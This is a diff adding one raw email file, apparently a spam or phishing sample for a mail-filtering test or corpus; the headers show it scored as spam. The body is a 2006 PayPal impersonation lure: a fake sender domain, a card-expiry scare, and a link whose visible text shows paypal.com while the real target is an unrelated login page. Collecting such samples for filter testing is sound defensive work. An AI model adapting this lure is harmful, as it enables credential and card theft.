@@ -1,0 +1,52 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <Barcelona@p15184786.pureserver.info>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 5D5EE46889
+ for <user@login.example.com>; Sun,  5 Nov 2006 19:58:35 -0500 (EST)
+Received: from localhost (localhost [127.0.0.1])
+ by mail.example.org (Postfix) with ESMTP id 16AE0131F7DC
+ for <user@example.com>; Sun,  5 Nov 2006 19:58:35 -0500 (EST)
+X-Spam-Flag: YES
+X-Spam-Score: 10.642
+X-Spam-Level: **********
+X-Spam-Status: Yes, score=10.642 tagged_above=-100 required=4
+ tests=[BAYES_40=-0.185, DATE_IN_PAST_03_06=0.478, DCC_CHECK=4,
+ DIGEST_MULTIPLE=0.765, HTML_MESSAGE=0.001,
+ HTML_MIME_NO_HTML_TAG=1.082, MIME_HEADER_CTYPE_ONLY=0,
+ MIME_HTML_ONLY=0.001, RAZOR2_CF_RANGE_51_100=0.5,
+ RAZOR2_CF_RANGE_E4_51_100=1.5, RAZOR2_CHECK=2.5]
+Received: from mail.example.org ([127.0.0.1])
+ by localhost (spammy.monkey.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id dA49bjDOzzOm for <user@example.com>;
+ Sun,  5 Nov 2006 19:58:30 -0500 (EST)
+X-Greylist: delayed 8166 seconds by postgrey-1.27 at mail.example.org;
+ Sun, 05 Nov 2006 19:58:30 EST
+Received: from p15184786.pureserver.info (p15184786.pureserver.info
+ [212.227.57.114]) by mail.example.org (Postfix) with ESMTP
+ for <user@example.com>; Sun,  5 Nov 2006 19:58:29 -0500 (EST)
+Received: (qmail 3681 invoked by uid 10020); 5 Nov 2006 21:18:05 +0100
+Date: 5 Nov 2006 21:18:05 +0100
+Message-ID: <20061105201805.3680.qmail@p15184786.pureserver.info>
+To: user@example.com
+Subject: Credit Card Expiration Approaching!
+From: PayPal <service@PayPal.con>
+Content-Type: text/html
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 435
+
+
+<DIV id=yiv1193040708>
+<P><FONT size=2><FONT face=Verdana>Dear Member of PayPal,<BR><BR>Your credit card ending in&nbsp;XXXX will expire soon.<BR><BR>- You may no longer be able to use PayPal<BR><BR>To avoid any interruption to your service, please update your credit <BR>card&nbsp; by following the&nbsp;link below :<BR><BR></FONT><A href="http://eu117-105.clientes.euskaltel.es/~elektra/PayPal/login.html" target=_blank rel=nofollow _><FONT face=Verdana color=#003399>https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit</FONT></A><BR><BR><BR><BR><FONT face=Verdana>Thank you for using PayPal!<BR>The PayPal Team</FONT></FONT></P><FONT face=Verdana size=2>
+<P><BR>----------------------------------------------------------------<BR>PROTECT YOUR PASSWORD</P>
+<P>NEVER give your password to anyone, including PayPal employees. Protect <BR>yourself against fraudulent websites by opening a new web browser (e.g. <BR>Internet Explorer or Netscape) and typing in the PayPal URL every time <BR>you log in to your account.</P>
+<P><BR>----------------------------------------------------------------</P>
+<P>GET MORE CREDIT <BR>PayPal Buyer Credit is a personal line of credit that you can use <BR>anywhere PayPal is accepted. Apply today and enjoy these benefits:</P>
+<P>- Shop now and pay later - make low monthly payments!<BR>- Take advantage of promotional financing on select eBay items.<BR>- Get full buyer protection from PayPal for all your purchases.</P>
+<P>&nbsp;</P>
+<P>Please do not reply to this email. This mailbox is not monitored and <BR>you will not receive a response. For assistance, log in to your PayPal <BR>account and click the Help link located in the top right corner of any <BR>PayPal page.</P>
+<P>PayPal Email ID PP031</FONT></P></DIV>
+<P>&nbsp;</P>
